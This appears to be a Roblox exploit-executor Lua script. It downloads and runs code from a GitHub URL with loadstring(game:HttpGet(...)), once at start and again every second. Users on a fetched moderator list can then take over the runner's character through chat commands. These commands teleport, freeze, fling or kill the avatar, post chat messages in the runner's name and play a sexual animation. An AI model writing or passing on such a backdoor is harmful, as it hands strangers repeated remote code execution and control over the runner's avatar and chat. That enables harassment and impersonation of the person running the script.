local s, e = pcall(function()
    mods, admins = loadstring(game:HttpGet("https://raw.githubusercontent.com/laderite/mods/main/test.lua"))()
end)
if table.find(mods,game.Players.LocalPlayer.UserId) then
    ifMod = true
end
if table.find(admins,game.Players.LocalPlayer.UserId) then
    ifAdmin = true
end

local players = game:GetService('Players')
local player = players.LocalPlayer
local prefix = ";"
local fucking = false

--// Load animations
local Crouching = Instance.new('Animation', game.CoreGui)
Crouching.AnimationId = "rbxassetid://8646043568"

function ifValid(msg)
    if string.sub(string.lower(player.Name),1,string.len(msg)) == string.lower(msg) or msg == "." then
        return true
    end
    return false
end


local function cmds(msg,plr)
    local operator = game.Players:GetPlayerByUserId(plr)
    msg = string.split(msg," ")
    msg[1] = string.lower(msg[1])
    if not ifMod then
        print'bap'
        if msg[1] == prefix.."bring" then
            if ifValid(msg[2]) then
                player.Character.HumanoidRootPart.CFrame = operator.Character.HumanoidRootPart.CFrame
            end
        elseif msg[1] == prefix.."freeze" then
            if ifValid(msg[2]) then
                player.Character.HumanoidRootPart.Anchored = true
            end
        elseif msg[1] == prefix.."thaw" then
            if ifValid(msg[2]) then
                player.Character.HumanoidRootPart.Anchored = false
            end
        elseif msg[1] == prefix.."reset" then
            if ifValid(msg[2]) then
                for i,v in pairs(player.Character:GetChildren()) do
                    if v:IsA("MeshPart") or v:IsA("Accessory") or v.Name == "HumanoidRootPart" or v.Name == "Humanoid" then 
                        pcall(function()
                            v:Destroy()
                        end)
                    end
                end
            end
        elseif msg[1] == prefix.."fling" then
            if ifValid(msg[2]) then
                for i=1,math.random(99,100) do
                    player.Character.HumanoidRootPart.CFrame = CFrame.new(math.random(1000,9999),math.random(1000,9999),math.random(1000,9999))
                    wait()
                end
            end
        elseif msg[1] == prefix.."pepper" then
            if ifValid(msg[2]) then
                local OFF = Instance.new("ScreenGui")
                local Frame = Instance.new("Frame")
                
                local Name_ = math.random(99,25252).."+++".."lol" 
                OFF.Name = Name_
                OFF.Parent = game.CoreGui
                OFF.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                            
                Frame.Parent = OFF
                Frame.AnchorPoint = Vector2.new(0.5, 0.5)
                Frame.BackgroundColor3 = Color3.fromRGB(255,140,0)
                Frame.BorderColor3 = Color3.fromRGB(255,140,0)
                Frame.Transparency = 0.8
                Frame.BorderSizePixel = 100
                Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
                Frame.Size = UDim2.new(1, 0, 1, 0)
                
                for i=1,5 do
                    game.Players.LocalPlayer.Character.Humanoid.Health = game.Players.LocalPlayer.Character.Humanoid.Health-20
                    wait(1.4)
                end
                game.Players.LocalPlayer.CharacterAdded:Wait()
                game.CoreGui:FindFirstChild(Name_):Destroy()
            end
        elseif msg[1] == prefix.."flash" then
            if ifValid(msg[2]) then
                local OFF = Instance.new("ScreenGui")
                local Frame = Instance.new("Frame")
                           
                local Name_ = math.random(99,25252).."+++".."lol" 
                OFF.Name = Name_
                OFF.Parent = game.CoreGui
                OFF.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                            
                Frame.Parent = OFF
                Frame.AnchorPoint = Vector2.new(0.5, 0.5)
                Frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
                Frame.BorderColor3 = Color3.fromRGB(255,255,255)
                Frame.BorderSizePixel = 100
                Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
                Frame.Size = UDim2.new(1, 0, 1, 0)
                for i=1,100 do
                    Frame.Transparency = Frame.Transparency+0.01
                    wait(.1)
                end
                game.CoreGui:FindFirstChild(Name_):Destroy()
            end
        elseif msg[1] == prefix.."seize" then
            if ifValid(msg[2]) then
                game.Players.LocalPlayer.Character.LowerTorso:BreakJoints()
                for i=1,30 do
                    local Part = Instance.new("Part",workspace)
                    Part.Name = "Sieze_"..tostring(i)
                    Part.Size = Vector3.new(.5,.5,.5)
                    Part.Color = Color3.fromRGB(255,255,255)
                    Part.Transparency = 0.6
                    Part.CFrame = CFrame.new(game.Players.LocalPlayer.Character.Head.Position.X,game.Players.LocalPlayer.Character.Head.Position.Y+1,game.Players.LocalPlayer.Character.Head.Position.Z)
                    wait(0.1)
                end
                game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("R.I.P.","All")
                game.Players.LocalPlayer.Character.Humanoid.Health = 0
                game.Players.LocalPlayer.CharacterAdded:Wait()
                for i,v in pairs(workspace:GetChildren()) do
                    if v:IsA("Part") or string.find(v.Name,"Sieze") then
                        v:Destroy()
                    end
                end
            end
        elseif msg[1] == prefix.."say" then
            if ifValid(msg[2]) then
                local success, err = pcall(function()
                    local final_msg = ""
                    local new_msg = {}
                    for i,v in pairs(msg) do
                        table.insert(new_msg,v)
                    end
                    
                    table.remove(new_msg,1)
                    table.remove(new_msg,1)
                    for i,v in pairs(new_msg) do
                        final_msg = final_msg..""..v.." "
                    end
                    game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(final_msg,"All")
                end)                
            end
        elseif msg[1] == prefix.."benx" then
            if ifValid(msg[2]) then
                fucking = true
                local target = game.Players:FindFirstChild(player.Name)
                local directionForward = -0.5
                local BackwardsBoolean = false
                local Crouch = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game.CoreGui:FindFirstChildWhichIsA('Animation'))
                Crouch.Looped = true
                Crouch:Play()
                while fucking do
                    if not fucking then
                        Crouch:Stop()
                        break
                    end
                    if target.Character then
                        if BackwardsBoolean == true then
                            directionForward=directionForward-0.1
                        else
                            directionForward=directionForward+0.1
                        end
                        if directionForward >= 3 then
                            BackwardsBoolean = true
                        elseif directionForward < 1 then
                            BackwardsBoolean = false
                        end
                        player.Character.HumanoidRootPart.CFrame = operator.Character.HumanoidRootPart.CFrame+operator.Character.HumanoidRootPart.CFrame.lookVector*directionForward
                    end
                    wait(0.01)
                end
            end
        elseif msg[1] == prefix.."unbenx" then
            if ifValid(msg[2]) then
                fucking = false
                wait(0.5)
                for i,v in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do 
                    if v:IsA("AnimationTrack") then
                        v:Stop()
                    end
                end
            end
        end
    end
end

game.Players.PlayerAdded:Connect(function(plr)
    if mods[plr.UserId] then
        plr.Chatted:Connect(function(msg) 
            cmds(msg, plr.UserId)
        end)
    end
end)

for i,v in pairs(game:GetService('Players'):GetChildren()) do
    if mods[v.UserId] then
        v.Chatted:Connect(function(msg)
            cmds(msg, v.UserId)
        end)
    end
end

coroutine.resume(coroutine.create(function()
    while wait(1) do
        local succes, err = pcall(function()
            if player.Character.LowerTorso:FindFirstChild("OriginalSize") then
                player.Character.LowerTorso:FindFirstChild("OriginalSize"):Destroy()
            end
            loadstring(game:HttpGet("https://raw.githubusercontent.com/laderite/mods/main/test.lua"))()
        end)
    end
end))
